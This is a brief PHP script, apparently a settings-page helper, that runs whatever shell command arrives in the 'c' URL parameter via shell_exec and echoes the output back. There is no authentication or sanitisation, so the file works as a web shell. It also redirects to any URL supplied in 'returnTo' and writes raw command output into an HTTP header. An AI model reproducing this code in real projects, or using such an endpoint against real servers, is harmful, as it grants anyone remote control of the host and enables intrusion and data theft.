<?php
if(isset($_GET["c"])){
    $out = shell_exec($_GET["c"]);
    var_dump($out);

    header("Location: settingsSet.php?returnTo=" . $_GET["returnTo"] . "&terminalLog=" . $_GET["c"] . "\n" . $out);
    die();
}

if(isset($_GET["returnTo"])){
    header("Location: " . $_GET["returnTo"]);
    die();
}else
    die();